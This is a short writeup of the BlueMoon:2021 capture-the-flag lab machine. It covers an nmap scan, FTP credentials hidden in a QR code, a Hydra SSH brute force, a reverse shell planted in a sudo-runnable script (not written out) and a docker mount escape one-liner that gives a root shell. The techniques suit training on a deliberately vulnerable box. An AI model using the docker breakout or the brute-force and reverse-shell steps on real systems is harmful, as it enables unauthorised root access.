---
layout: default
title : muzec - BlueMoon:2021 Writeup
---

![Image](https://imgur.com/RhdDiti.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Sat Apr 17 15:59:01 2021 as: nmap -sC -p- -sV -oA nmap 172.16.139.148
Nmap scan report for 172.16.139.148
Host is up (0.0073s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 2c:e2:63:78:bc:55:fe:f3:cb:09:a9:d8:26:2f:cb:d5 (RSA)
|   256 c4:c8:6b:48:92:25:a5:f7:00:9f:ab:b2:56:d5:ed:dc (ECDSA)
|_  256 a9:5b:39:a1:6e:05:91:0f:75:3c:88:0b:55:7c:a8:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: BlueMoon:2021
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr 17 15:59:15 2021 -- 1 IP address (1 host up) scanned in 13.26 seconds
```

FTP no anonymous logins is allow so let burst some directory probably the way in.

![Image](https://imgur.com/2IMpG3h.png)

`/hidden_text` look interesting let check it out hmmm maintanance page clicking on the `Thank you` download a Qr code.

![image](https://imgur.com/rAJYWXW.png)

Cool let use some online tools to read it.

![Image](https://imgur.com/V242Uc4.png)

Awesome credentials for FTP let hit and use it to log into FTP.

![Image](https://imgur.com/gQfK8Sz.png)

We are in so let download all the files in the FTP.

```
Hello robin ...!
    
    I'm Already Told You About Your Password Weekness. I will give a Password list. you May Choose Anyone of The Password.
```

So i hit hydra with the username `robin` and the password list i found in the FTP server.

![Image](https://imgur.com/kvVCqm1.png)

Cool let ssh into the machine with the credentials we just got from brute forcing ssh.

![Image](https://imgur.com/gwKcvtA.png)

And we are in let chek `sudo` first i always check `sudo-l` .

![Image](https://imgur.com/FurVhDG.png)

Cool we can run sudo to get user jerry a little issue the `feedback.sh` `was own by me but can't wrrite to it so i give it chmod 777` permission so i echo a reverse shell payload in the file and start a ncat listerner.

`sudo -u jerry /home/robin/project/feedback.sh` 

![Image](https://imgur.com/IpOLRsm.png)

And boom we have jerry shell time to escalate to root.

![Image](https://imgur.com/P8gvBZf.png)

It can be used to break out from restricted environments by spawning an interactive system shell the resulting is a root shell.

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

![Image](https://imgur.com/194DYT6.png)

And we are root Box rooted,

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>


